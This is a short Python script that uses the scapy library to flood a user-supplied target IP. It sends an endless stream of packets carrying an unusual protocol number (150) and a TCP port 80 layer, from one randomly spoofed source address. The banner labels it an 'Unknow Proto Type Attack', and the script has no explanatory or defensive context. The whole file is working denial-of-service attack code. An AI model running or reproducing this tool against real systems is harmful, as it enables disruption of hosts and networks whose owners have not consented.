import scapy.all as scapy
import os

def UnProtoType():

	clear = os.system('clear')

	print("**************************************")
	print("      Unknow Proto Type Attack")
	print("**************************************")
	print("Please input your target's IP")
	target = input("[UnProtoAttack]#")   
	srcip = scapy.RandIP()

	packet_num = 0

	try:
		while True:
			packet = scapy.IP(src=srcip,dst = target,proto=150)/scapy.TCP(dport=80)
			scapy.send(packet,verbose=False)
			packet_num += 1
			print("[+]Sent packet is "+str(packet_num))
	except KeyboardInterrupt:
		print("[-]Ctrl +C detected ...")



UnProtoType()